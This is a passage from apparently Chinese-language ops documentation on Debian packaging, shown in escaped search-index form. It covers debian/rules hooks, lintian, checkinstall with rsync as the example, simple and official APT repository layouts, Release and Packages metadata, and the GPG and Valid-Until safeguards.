\u200b\u5728\u200b\u67d0\u4e2a\u200b\u64cd\u4f5c\u200b\u4e4b\u524d\u200b\u505a\u200b\u4e00\u4e9b\u200b\u4e8b\u60c5\u200b\nexecute_before_dh_auto_clean:\n  echo \"Something before dh_auto_clean\"\n\n# \u200b\u5728\u200b\u67d0\u4e2a\u200b\u64cd\u4f5c\u200b\u4e4b\u540e\u200b\u505a\u200b\u4e00\u4e9b\u200b\u4e8b\u60c5\u200b\nexecute_after_dh_auto_clean:\n  echo \"Something after dh_auto_clean\"\n\n# \u200b\u8986\u76d6\u200b\u67d0\u4e2a\u200b\u64cd\u4f5c\u200b\noverride_dh_auto_clean:\n    echo \"Custom clean step\"\n</code></pre> <p>\u200b\u5728\u200b\u4f7f\u7528\u200b <code>dpkg-buildpackage</code> \u200b\u6784\u5efa\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>lintian</code> \u200b\u6765\u200b\u68c0\u67e5\u200b\u5305\u200b\u662f\u5426\u200b\u7b26\u5408\u200b Debian \u200b\u7684\u200b\u89c4\u8303\u200b\u3002\u200b\u5728\u200b\u6253\u5305\u200b\u7684\u200b\u76ee\u5f55\u200b\u6267\u884c\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>lintian -i -I\n</code></pre> <p>\u200b\u6dfb\u52a0\u200b\u7684\u200b <code>-i</code> \u200b\u548c\u200b <code>-I</code> \u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u5bf9\u200b\u6253\u5305\u200b\u8d28\u91cf\u200b\u7684\u200b\u8981\u6c42\u200b\u66f4\u9ad8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f00\u542f\u200b lintian \u200b\u7684\u200b pedantic \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u542f\u7528\u200b\u5b9e\u9a8c\u200b\u6027\u8d28\u200b\u7684\u200b\u4e00\u4e9b\u200b\u68c0\u67e5\u200b\uff1a</p> <pre><code>lintian --pedantic -E -i -I\n</code></pre>"},{"location":"ops/package/#checkinstall","title":"\u4f7f\u7528\u200b <code>checkinstall</code> \u200b\u5feb\u901f\u200b\u6253\u5305","text":"<p>checkinstall \u200b\u5de5\u5177\u200b\u4ec5\u200b\u9002\u7528\u200b\u4e8e\u200b\u4e34\u65f6\u200b\u6253\u5305\u200b</p> <p>checkinstall \u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\u662f\u200b\uff0c\u200b\u5728\u200b <code>make install</code> \u200b\u4f7f\u7528\u200b <code>installwatch</code> \u200b\u73af\u8282\u200b\u62e6\u622a\u200b\u6587\u4ef6\u200b\u76f8\u5173\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff08\u200b\u7c7b\u4f3c\u200b <code>strace</code>\uff09\uff0c\u200b\u68c0\u67e5\u200b\u6587\u4ef6\u200b\u7684\u200b\u53d8\u5316\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u5176\u200b\u6253\u5305\u200b\u4e3a\u200b deb \u200b\u5305\u200b\u3002\u200b\u56e0\u6b64\u200b\u5176\u200b\u53ea\u200b\u9002\u7528\u200b\u4e8e\u200b\u4f7f\u7528\u200b Makefile \u200b\u6784\u5efa\u200b\u7cfb\u7edf\u200b\uff08\u200b\u5305\u62ec\u200b <code>cmake</code>\u3001<code>autotools</code> \u200b\u7b49\u200b\uff09\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u3002\u200b\u5e76\u4e14\u200b checkinstall \u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u5176\u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u590d\u6742\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u67d0\u200b\u8f6f\u4ef6\u5305\u200b\u5728\u200b\u5b89\u88c5\u200b\u65f6\u200b\u4fee\u6539\u200b\u4e86\u200b <code>/etc/passwd</code>\uff0c\u200b\u90a3\u4e48\u200b checkinstall \u200b\u65e0\u6cd5\u200b\u6b63\u786e\u200b\u6253\u5305\u200b\u8fd9\u4e2a\u200b\u8f6f\u4ef6\u5305\u200b\u2014\u2014\u200b\u5728\u200b\u5378\u8f7d\u200b\u65f6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7834\u574f\u200b\u7cfb\u7edf\u200b<sup>1</sup>\u3002</p> <p>Debian \u200b\u6253\u5305\u200b\u662f\u200b\u4e00\u9879\u200b\u590d\u6742\u200b\u7684\u200b\u5de5\u4f5c\u200b\u3002\u200b\u9488\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f16\u7a0b\u8bed\u8a00\u200b\u4e0e\u200b\u6784\u5efa\u200b\u7cfb\u7edf\u200b\uff0cDebian \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b <code>dh-make-golang</code> \u200b\u53ef\u4ee5\u200b\u6253\u5305\u200b Go \u200b\u8bed\u8a00\u200b\u9879\u76ee\u200b\uff09\u200b\u8f85\u52a9\u200b\u6253\u5305\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5728\u200b\u64cd\u4f5c\u524d\u200b\u5148\u884c\u200b\u641c\u7d22\u200b\u3002<code>debmake</code> \u200b\u5de5\u5177\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u751f\u6210\u200b\u4e00\u4e9b\u200b Debian \u200b\u6253\u5305\u200b\u7684\u200b\u6a21\u677f\u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ee5\u200b\u7f16\u8bd1\u200b rsync \u200b\u4e3a\u200b\u4f8b\u5b50\u200b\u4ecb\u7ecd\u200b\u3002\u200b\u9996\u5148\u200b\u6b63\u5e38\u200b\u914d\u7f6e\u200b\u5e76\u200b\u7f16\u8bd1\u200b\uff1a</p> <pre><code>git clone https://github.com/RsyncProject/rsync.git\n./configure\nmake -j$(nproc)\n</code></pre> <p>\u200b\u7136\u540e\u200b\u6267\u884c\u200b <code>checkinstall</code>:</p> <pre><code>sudo checkinstall\n</code></pre> <p><code>checkinstall</code> \u200b\u4f1a\u200b\u8be2\u95ee\u200b\u4e00\u4e9b\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u540d\u79f0\u200b\u3001\u200b\u7248\u672c\u200b\u3001\u200b\u63cf\u8ff0\u200b\u7b49\u7b49\u200b\u3002\u200b\u7248\u672c\u200b\u9ed8\u8ba4\u200b\u4e3a\u7a7a\u200b\uff0c\u200b\u4f46\u662f\u200b\u5fc5\u987b\u200b\u586b\u5199\u200b\uff0c\u200b\u5426\u5219\u200b\u540e\u7eed\u200b\u6b65\u9aa4\u200b\u4f1a\u200b\u62a5\u9519\u200b\u3002\u200b\u914d\u7f6e\u200b\u5e76\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u540e\u200b\uff1a</p> <pre><code>**********************************************************************\n\n Done. The new package has been installed and saved to\n\n /path/to/rsync/rsync_3.4.1-7_amd64.deb\n\n You can remove it from your system anytime using: \n\n      dpkg -r rsync\n\n**********************************************************************\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b <code>rsync</code> \u200b\u5b89\u88c5\u200b\u5728\u200b\u4e86\u200b <code>/usr/local/bin/</code> \u200b\u4e0b\u200b\uff1a</p> <pre><code>$ which rsync\n/usr/local/bin/rsync\n</code></pre> <p>\u200b\u5728\u200b\u5378\u8f7d\u200b\u524d\u200b\uff0c\u200b\u5efa\u8bae\u200b\u624b\u5de5\u200b\u68c0\u67e5\u200b\u751f\u6210\u200b\u7684\u200b deb \u200b\u5305\u200b\uff0c\u200b\u907f\u514d\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u200b\u88ab\u200b\u5220\u9664\u200b\u3002</p>"},{"location":"ops/package/#repo","title":"\u8f6f\u4ef6\u200b\u6e90\u76ee\u5f55\u200b\u7ed3\u6784","text":"<p>Debian \u200b\u7684\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u5b58\u50a8\u200b\u4e86\u200b\u591a\u4e2a\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u4ee5\u200b APT \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u7684\u200b\u683c\u5f0f\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u7528\u6237\u200b\u3002</p>"},{"location":"ops/package/#simple-structure","title":"\u7b80\u5355\u200b\u7ed3\u6784\u200b\u4e0e\u200b\u751f\u6210\u200b\u793a\u4f8b","text":"<p>\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u6e90\u76ee\u5f55\u200b\u7ed3\u6784\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>.\n\u251c\u2500\u2500 firefox-vlab_1vlab3_all.deb\n\u251c\u2500\u2500 Packages\n\u251c\u2500\u2500 Release\n\u251c\u2500\u2500 vlab-cli_1.0-1_all.deb\n\u251c\u2500\u2500 vlab-earlyoom_1.1-5_all.deb\n\u251c\u2500\u2500 vlab-earlyoom-static_1.1-5_amd64.deb\n\u2514\u2500\u2500 vlab-vnc_1.0-3_all.deb\n</code></pre> <p>\u200b\u9664\u4e86\u200b <code>deb</code> \u200b\u6587\u4ef6\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e24\u4e2a\u200b\u5173\u952e\u200b\u7684\u200b\u6587\u4ef6\u200b\u662f\u200b <code>Packages</code> \u200b\u4e0e\u200b <code>Release</code>\u3002<code>Packages</code> \u200b\u6587\u4ef6\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u5c06\u200b\u6240\u6709\u200b\u5305\u200b\u7684\u200b <code>control</code> \u200b\u6587\u4ef6\u200b\u8fde\u63a5\u8d77\u6765\u200b\uff0c\u200b\u50cf\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>Package: firefox-vlab\nVersion: 2:1vlab3\nArchitecture: all\nOrigin: Ubuntu\nMaintainer: USTC Vlab &lt;vlab@ustc.edu.cn&gt;\nPre-Depends: debconf\nDepends: debconf (&gt;= 0.5) | debconf-2.0\nBreaks: firefox, firefox-dbg, firefox-dev, firefox-geckodriver, firefox-mozsymbols\nReplaces: firefox, firefox-dbg, firefox-dev, firefox-geckodriver, firefox-mozsymbols\nProvides: gnome-www-browser, iceweasel, www-browser, x-www-browser\nFilename: ./firefox-vlab_1vlab3_all.deb\nSize: 7376\nMD5sum: 943c78a714ec598de5ccb1a1d704fa4d\nSHA1: 7818966860329bc18ff224b8ff549006a3ef8146\nSHA256: a9e1d012abe7dc4e341674770d6297b7acea0e3dfb541f189e02f1c8ffe9715a\nSection: web\nPriority: optional\nDescription: System files for Firefox on Vlab Software\n\nPackage: vlab-cli\nVersion: 1.0-1\nArchitecture: all\nMaintainer: USTC Vlab &lt;vlab@ustc.edu.cn&gt;\nDepends: bash (&gt;= 4.2)\nRecommends: vlab-vnc\nFilename: ./vlab-cli_1.0-1_all.deb\nSize: 1440\nMD5sum: 8411c78ab73dc18c914c7409e3c22357\nSHA1: c3a5da87a8e5ebc3729a3afda5779413c6bc8b3a\nSHA256: 58a804b96e7b8bdd450436ca07c75d7a2e05cd121a680dd17474514736d7c99e\nSection: base\nPriority: optional\nDescription: CLI for legacy Vlab VM settings\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b\u5176\u200b\u5305\u542b\u200b\u4e00\u4e9b\u200b\u65b0\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>Filename</code>\uff08\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u7684\u200b\u8def\u5f84\u200b\uff09\u3001<code>Size</code>\u3001<code>MD5sum</code>\u3001<code>SHA1</code> \u200b\u4e0e\u200b <code>SHA256</code>\u3002\u200b\u8be5\u200b\u6587\u4ef6\u200b\u4f7f\u7528\u200b <code>dpkg-scanpackages</code> \u200b\u751f\u6210\u200b\uff1a</p> <pre><code>dpkg-scanpackages . &gt; Packages\n</code></pre> <p>\u200b\u800c\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u5219\u200b\u5305\u542b\u200b\u4e86\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Date: Fri, 07 Feb 2025 16:21:05 +0000\nLabel: Vlab\nOrigin: vlab.ustc.edu.cn\nMD5Sum:\n ddf53358082c24a5c89516c46eb00b0d             2770 Packages\n 1e0a4d927bce3b4c809157264c731de9               75 Release\nSHA1:\n 0be434c15790a9875f4217709996d1140abc330b             2770 Packages\n 43414ec15d46888bf6752f8d4e65afb0a8c67b26               75 Release\nSHA256:\n e65405d61f505b6c62c61adc4330820ce9a8d850b839ce9de3c8114da9313b1c             2770 Packages\n f78327f58a7cf57703d206399bd693766c66c98a3296e3a84aef33c54f6c8b1f               75 Release\nSHA512:\n 88ba61c27d624c01a61eff8722669a8e51d7055db4f4bdd49aa8ff965f44ab6388b6cd4aa502d22ef1a793e8fbf8510ed92946c6a9b53b313bddc0e2069421b3             2770 Packages\n 30ef3ac9a9cabc3d40b63b2eaec615a77ef7eb33bb5a3c7c76cc95eab86cf74355a87811d985519b2d144952433b8c20e039aaca7eee26b6d459a86d78eaf9ee               75 Release\n</code></pre> <p>\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u751f\u6210\u200b\u65f6\u95f4\u200b\u3001\u200b\u76f8\u5173\u200b\u6587\u4ef6\u200b\u7684\u200b\u54c8\u5e0c\u200b\uff08<code>Release</code> \u200b\u7684\u200b\u54c8\u5e0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b <code>MD5Sum</code> \u200b\u4e4b\u524d\u200b\u7684\u200b\u90e8\u5206\u200b\uff09\uff0c\u200b\u4ee5\u53ca\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002\u200b\u8be5\u200b\u6587\u4ef6\u200b\u4f7f\u7528\u200b <code>apt-ftparchive</code> \u200b\u751f\u6210\u200b\uff1a</p> <pre><code>$ cd ..\n$ cat main.conf\nAPT::FTPArchive::Release::Origin \"vlab.ustc.edu.cn\";\nAPT::FTPArchive::Release::Label \"Vlab\";\n$ apt-ftparchive -c main.conf release builddir &gt; builddir/Release\n</code></pre> <p>\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u65f6\u200b\u7684\u200b\u914d\u7f6e\u200b\u4e3a\u200b\uff1a</p> <pre><code>deb [trusted=yes] https://deb.example.com/repo/ ./\n</code></pre> <p>\u200b\u6216\u200b DEB822 \u200b\u683c\u5f0f\u200b\uff1a</p> <pre><code>Types: deb\nURIs: https://deb.example.com/repo/\nSuites: ./\nTrusted: yes\n</code></pre> <p><code>Signed-By</code> \u200b\u4e0e\u200b GPG \u200b\u7b7e\u540d\u200b</p> <p>\u200b\u4ece\u200b apt 2.9.24 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u6ca1\u6709\u200b <code>Signed-By</code> \u200b\u5b57\u6bb5\u200b\u7684\u200b\u6e90\u4f1a\u200b\u89c6\u4f5c\u200b\u5e9f\u5f03\u200b\u72b6\u6001\u200b\uff0c\u200b\u5e76\u5f39\u200b\u51fa\u200b\u8b66\u544a\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>Notice: Missing Signed-By in the sources.list(5) entry for 'https://deb.example.com/repo'\n</code></pre> <p>\u200b\u7531\u4e8e\u200b\u6dfb\u52a0\u200b\u4e86\u200b <code>Trusted: yes</code>\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u79cd\u200b\u7ed5\u8fc7\u200b\u7684\u200b\u65b9\u6848\u200b\u662f\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u76f8\u5173\u200b\u7684\u200b <code>Signed-By</code>\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Types: deb\nURIs: https://deb.example.com/repo/\nSuites: ./\nTrusted: yes\nSigned-By: /usr/share/keyrings/debian-archive-keyring.gpg\n</code></pre> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u81ea\u884c\u200b\u642d\u5efa\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\uff0c\u200b\u4ecd\u7136\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b GPG \u200b\u7b7e\u540d\u200b\u4fdd\u969c\u200b\u8f6f\u4ef6\u5305\u200b\u4e0d\u200b\u88ab\u200b\u7be1\u6539\u200b\u3002\u200b\u53ea\u200b\u9700\u8981\u200b\u7ed9\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u7b7e\u540d\u200b\u5373\u53ef\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u7b7e\u540d\u200b\u5b58\u50a8\u200b\u5728\u200b <code>Release.gpg</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff0c\u200b\u6216\u8005\u200b\u5c06\u200b\u7b7e\u540d\u200b\u9644\u52a0\u200b\u5728\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u751f\u6210\u200b <code>InRelease</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u5c06\u200b\u516c\u94a5\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u7528\u6237\u200b\u3002\u200b\u8f6f\u4ef6\u5305\u200b\u672c\u8eab\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\u5219\u200b\u7531\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u54c8\u5e0c\u200b\u503c\u200b\u4fdd\u969c\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8fdb\u4e00\u6b65\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u4fdd\u969c\u200b\uff0c\u200b\u8f6f\u4ef6\u5305\u200b\u7ef4\u62a4\u8005\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u8f6f\u4ef6\u5305\u200b\u672c\u8eab\u200b\u7b7e\u540d\u200b\uff0c\u200b\u6b64\u5904\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\u3002</p>"},{"location":"ops/package/#official-structure","title":"\u5b98\u65b9\u200b\u6e90\u200b\u7ed3\u6784","text":"<p>\u200b\u5982\u679c\u200b\u89c2\u5bdf\u200b\u8fc7\u200b Debian \u200b\u6216\u200b Ubuntu \u200b\u5b98\u65b9\u200b\u6e90\u200b\u7684\u200b\u7ed3\u6784\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u4eec\u200b\u4f1a\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\uff0c\u200b\u4e00\u822c\u6765\u8bb2\u200b\uff0c\u200b\u4ed3\u5e93\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u4f1a\u200b\u5b58\u50a8\u200b\u5728\u200b <code>dists</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u800c\u200b\u8f6f\u4ef6\u5305\u200b\u5219\u200b\u5b58\u50a8\u200b\u5728\u200b <code>pool</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002<code>dists</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7b2c\u4e00\u5c42\u200b\u4e3a\u200b\u53d1\u884c\u7248\u200b\uff08Suites\uff09\u200b\u76ee\u5f55\u200b\u3002\u200b\u4ee5\u200b Debian 12 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6700\u200b\u5e38\u200b\u4f7f\u7528\u200b\u7684\u200b\u5305\u542b\u200b <code>bookworm</code>, <code>bookworm-updates</code> \u200b\u548c\u200b <code>bookworm-backports</code> \u200b\u76ee\u5f55\u200b\u3002</p> <p>\u200b\u518d\u200b\u5411\u200b\u91cc\u200b\u4e00\u5c42\u200b\u5219\u200b\u5305\u542b\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u9664\u4e86\u200b <code>Release</code> \u200b\u4ee5\u5916\u200b\uff1a</p> <ul> <li><code>Release.gpg</code>\uff1a<code>Release</code> \u200b\u6587\u4ef6\u200b\u7684\u200b GPG \u200b\u7b7e\u540d\u200b\u3002<ul> <li>\u200b\u6b63\u89c4\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u90fd\u200b\u4f1a\u200b\u81ea\u5e26\u200b\u7ef4\u62a4\u8005\u200b\u7684\u200b GPG \u200b\u516c\u94a5\u200b\uff0c\u200b\u5728\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u5305\u200b\u65f6\u4f1a\u200b\u81ea\u52a8\u200b\u9a8c\u8bc1\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u7b7e\u540d\u200b\uff0c\u200b\u907f\u514d\u200b\u6076\u610f\u200b\u7be1\u6539\u200b\u3002</li> </ul> </li> <li><code>InRelease</code>\uff1a\u200b\u9644\u52a0\u200b\u4e86\u200b GPG \u200b\u7b7e\u540d\u200b\u7684\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u3002</li> <li><code>ChangeLog</code>\uff1a\u200b\u53d8\u66f4\u200b\u8bb0\u5f55\u200b\u3002</li> <li><code>contrib/</code>, <code>main/</code>, <code>non-free/</code>, <code>non-free-firmware/</code>\uff1a\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ec4\u4ef6\u200b\uff08Components\uff09\u3002</li> </ul> <p>@taoky: \u200b\u5b89\u5168\u66f4\u65b0\u200b\u6e90\u200b\u4e0e\u200b\u955c\u50cf\u200b\u7ad9\u200b</p> <p>\u200b\u66fe\u7ecf\u200b\u6709\u4eba\u200b\u95ee\u8fc7\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u955c\u50cf\u200b\u7ad9\u200b\u63d0\u4f9b\u200b\u5b89\u5168\u66f4\u65b0\u200b\u6e90\u200b\u7684\u8bdd\u200b\uff0c\u200b\u600e\u4e48\u200b\u4fdd\u8bc1\u200b\u955c\u50cf\u200b\u7ad9\u200b\u672c\u8eab\u200b\u4e0d\u4f1a\u200b\u901a\u8fc7\u200b\u62d6\u5ef6\u200b\u66f4\u65b0\u200b\u7b49\u200b\u65b9\u5f0f\u200b\u963b\u6b62\u200b\u7528\u6237\u200b\u83b7\u53d6\u200b\u5b89\u5168\u66f4\u65b0\u200b\uff1f</p> <p>\u200b\u9996\u5148\u200b\uff0cDebian \u200b\u4e0d\u200b\u9f13\u52b1\u200b\u4fee\u6539\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u5b89\u5168\u66f4\u65b0\u200b\u6e90\u200b\uff0c\u200b\u751a\u81f3\u200b\u5176\u200b\u5b89\u88c5\u200b\u5668\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5373\u4f7f\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u955c\u50cf\u200b\u7ad9\u200b\uff0c\u200b\u5b89\u5168\u66f4\u65b0\u200b\u4ecd\u7136\u200b\u4f1a\u200b\u4ece\u200b\u5b98\u65b9\u200b\u83b7\u53d6\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b Debian \u200b\u5b89\u88c5\u200b\u5668\u200b\u5728\u200b\u67d0\u4e9b\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u4e0b\u200b\u5f88\u200b\u6162\u200b\u7684\u200b\u4e00\u5927\u200b\u539f\u56e0\u200b\uff09\uff0c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u4e13\u5bb6\u200b\u6a21\u5f0f\u200b\u624d\u80fd\u200b\u4fee\u6539\u200b\u3002</p> <p>\u200b\u7136\u540e\u200b\uff0c\u200b\u5b89\u5168\u66f4\u65b0\u200b\u6e90\u200b\u7684\u200b <code>Release</code> \u200b\u6587\u4ef6\u200b\u6709\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a<code>Valid-Until</code>\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>Date: Sat, 08 Feb 2025 21:33:46 UTC\nValid-Until: Sat, 15 Feb 2025 21:33:46 UTC\n</code></pre> <p><code>Valid-Until</code> \u200b\u8ddd\u79bb\u200b <code>Release</code> \u200b\u751f\u6210\u200b\u4e3a\u671f\u200b\u4e00\u5468\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5373\u4f7f\u200b\u62d6\u5ef6\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u8d85\u8fc7\u200b\u4e00\u5468\u200b\uff0c\u200b\u5426\u5219\u200b APT \u200b\u4f1a\u200b\u62d2\u7edd\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u4ecd\u7136\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u8c28\u614e\u200b\u4f7f\u7528\u200b\u4efb\u4f55\u200b\u955c\u50cf\u200b\u7ad9\u200b\u63d0\u4f9b\u200b\u5b89\u5168\u66f4\u65b0\u200b\u6e90\u200b\u3002</p> <p>\u200b\u7ec4\u4ef6\u200b\u76ee\u5f55\u200b\u4e2d\u5219\u200b\u5305\u542b\u200b\u4e86\u200b\uff1a</p> <ul> <li><code>Contents-&lt;arch&gt;.gz</code>\uff1a\u200b\u7528\u4e8e\u200b\u5e2e\u52a9\u200b <code>apt-file</code> \u200b\u7b49\u200b\u5de5\u5177\u200b\u5feb\u901f\u200b\u67e5\u627e\u200b\u5305\u542b\u200b\u67d0\u200b\u6587\u4ef6\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u3002</li> <li><code>binary-&lt;arch&gt;/</code>\uff1a\u200b\u4e8c\u8fdb\u5236\u200b\u5305\u200b\u3002</li> <li><code>source/</code>\uff1a\u200b\u6e90\u4ee3\u7801\u200b\u5305\u200b\u3002</li> <li><code>by-hash/</code>\uff1a\u200b\u6587\u4ef6\u540d\u200b\u4e3a\u200b\u54c8\u5e0c\u200b\u503c\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u6587\u4ef6\u200b\u3002APT \u200b\u5728\u200b\u8bfb\u53d6\u200b <code>Release</code> \u200b\u4e4b\u540e\u200b\uff0c\u200b\u5728\u200b <code>Acquire-By-Hash: yes</code> \u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u9996\u5148\u200b\u6839\u636e\u200b\u54c8\u5e0c\u200b\u8bfb\u53d6\u200b\u8be5\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u9700\u8981\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u4f7f\u7528\u200b <code>rsync</code> \u200b\u540c\u6b65\u200b\u5185\u5bb9\u200b\u7684\u200b\u955c\u50cf\u200b\u7ad9\u70b9\u200b\u63d0\u5347\u200b\u53ef\u7528\u6027\u200b\uff0c\u200b\u907f\u514d\u200b\u5728\u200b\u540c\u6b65\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u90e8\u5206\u200b\u6587\u4ef6\u200b\u5931\u6548\u200b/\u200b\u672a\u200b\u540c\u6b65\u200b\u7b49\u200b\u5bfc\u81f4\u200b\u7684\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</li> </ul> <p>\u200b\u67b6\u6784\u200b\u76ee\u5f55\u200b\uff08\u200b\u4e8c\u8fdb\u5236\u200b/\u200b\u6e90\u4ee3\u7801\u200b\u5305\u200b\uff09\uff1a</p> <ul> <li><code>Packages.{gz,xz}</code>\uff1a\u200b\u538b\u7f29\u200b\u540e\u200b\u7684\u200b <code>Packages</code> \u200b\u6587\u4ef6\u200b\u3002<ul> <li>\u200b\u5982\u679c\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u4e0d\u200b\u5728\u200b\u672c\u5730\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>Packages</code> \u200b\u5fc5\u987b\u200b\u538b\u7f29\u200b\uff0c\u200b\u5426\u5219\u200b APT \u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u8bfb\u53d6\u200b\u3002</li> </ul> </li> <li><code>Release</code>\uff1a\u200b\u8be5\u200b\u67b6\u6784\u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\u3002</li> <li><code>by-hash/</code>\uff1a\u200b\u540c\u200b\u4e0a\u200b\u3002</li> </ul> <ol> <li> 